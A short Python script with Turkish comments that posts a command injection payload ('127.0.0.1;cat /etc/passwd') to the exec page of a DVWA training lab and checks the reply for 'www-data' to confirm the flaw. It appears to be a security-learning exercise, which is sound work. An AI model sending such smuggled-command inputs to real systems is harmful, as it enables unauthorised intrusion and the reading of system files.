import requests
import json
#Cookie,url ve data bilgisi sizde farklı olabilir 
header={"Cookie": "security=low; PHPSESSID=0639ced4e3b12926d1508f2dcf117b00"}
url="http://192.168.91.128/dvwa/vulnerabilities/exec/"
data={"ip":"127.0.0.1;cat /etc/passwd","submit":"submit"}

sonuc=requests.post(url=url,data=data,headers=header)
if "www-data" in str(sonuc.content):
    print("Command Injection vardır.")